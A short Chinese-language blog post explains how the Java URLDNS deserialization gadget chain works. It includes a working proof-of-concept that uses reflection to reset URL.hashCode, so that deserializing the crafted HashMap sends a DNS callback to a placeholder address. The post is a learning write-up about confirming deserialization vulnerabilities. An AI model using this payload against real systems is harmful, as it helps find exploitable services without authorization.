个人对于URLDNS链的一点理解
2023-04-01 23:16:51

最近在学习java的各种序列化漏洞，以下是小白对urldns链的一些理解。

调用链

Gadget Chain:

HashMap.readObject()

HashMap.putVal()

HashMap.hash()

URL.hashCode()

关于调用链，其他师傅的文章写过就不在一一调试，本文着重与讨论关于hashCode方法的判断，就是为什么要通过反射修改hashCode的值，以及修改顺序。

完整POC

public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
        URL url =new URL("dns返连地址");
        Class c = url.getClass();
        Field hashcodeField = c.getDeclaredField("hashCode");
        hashcodeField.setAccessible(true);
        hashcodeField.set(url,100); 
        hashMap.put(url,100);
        hashcodeField.set(url,-1);
        serialize(hashMap);
     	unserialize("ser.bin");
    }

serialize和unserialize就是普通的序列化与反序列化，就不放代码了。

其中，因为调用URL的hashCode方法时，hashcode会进行判断

但是hashCode的值在URL类里面默认为-1，

所以代码

hashMap.put(url,100);

必定触发一次hashCode方法，从而发起一次dns请求，此时，即使不进行序列化与反序列化操作，都会触发dns请求，无法验证反序列化漏洞，所以我们需要在put操作前对hashcode进行反射赋值，将其赋值为非-1的值，put操作后又进行再一次赋值，将hashcode改回-1，从而让dns请求是反序列化后发出的。

hashcodeField.set(url,100);
hashMap.put(url,100);
hashcodeField.set(url,-1);

进行反序列化：

可见，成功使该dns请求通过反序列化触发。

所以为了使该dns请求是反序列化触发的，需要在hashMap.put操作前进行反射赋值，这也是URLDNS链的关键点。
